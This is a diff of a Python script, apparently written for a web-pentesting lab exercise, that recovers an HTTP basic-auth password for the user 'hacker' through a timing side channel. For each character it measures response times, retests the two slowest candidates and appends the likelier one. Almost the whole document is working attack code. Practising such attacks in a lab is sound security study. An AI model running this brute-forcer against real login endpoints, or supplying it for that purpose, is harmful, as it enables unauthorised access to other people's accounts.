@@ -20,25 +20,27 @@ while True :
     list_length = len(pass_list)
     first= second = 0
     letter1 = letter2 = ""
+    url = "http://"+address+"/authentication/example2/"
     session = requests.Session()
-
-    finalcheck = session.get(url, auth=('hacker', password))    
-    if(r.status_code) == 200 :
-        print("Success")
-        break;
-    elif(r.status_code) == 401 :
+    
+    # Check password when it's blank first
+    check = session.get(url, auth=('hacker', password))    
+    if(check.status_code) == 200 :
+        print("Success! Password is: ", password)
+        sys.exit()
+    # Checks to see if the return code is still "unauthorized"
+    elif(check.status_code) == 401 :
         print("Continuing...")
+    else :
+        print("Bad request")
+        sys.exit()
 
+    # Iterates through alphanumeric list
     for x in range(list_length) :
-        url = "http://"+address+"/authentication/example2/"
-        print("Current password: ", password, " + ", pass_list[x])
         r = session.get(url, auth=('hacker', password+pass_list[x]))
-        print(r.status_code)
-        #if r.status_code != 200 :
-        #    print("Bad HTTP request")
-        #    sys.exit()
-
-        print("Response time :", r.elapsed.total_seconds())
+        print("Testing:", password, ":", pass_list[x], "->", r.elapsed.total_seconds())
+        
+        # As the elapsed time is calculated, keep track of top first and second longest response times
         y = r.elapsed.total_seconds()
         if y > first :
             letter1 = pass_list[x]
@@ -48,16 +50,17 @@ while True :
             letter2 = pass_list[x]
             second = y 
 
-
-    print(first, letter1)
-    print(second, letter2)
-
-
+    print("Most likely letter: ", letter1, "->", first)
+    print("Second most likely: ", letter2, "->", second)
+    print("Retesting...")
+    
+    # Double check the two most likely characters in case of delay spike
     check1 = session.get(url, auth=('hacker', password+letter1))
     s = check1.elapsed.total_seconds()
     check2 = session.get(url, auth=('hacker', password+letter2))    
     t = check2.elapsed.total_seconds()
-
+    
+    # Append correct letter to current password 
     password = password+letter1 if s > t else password+letter2
     print("Current password : ", password)
     
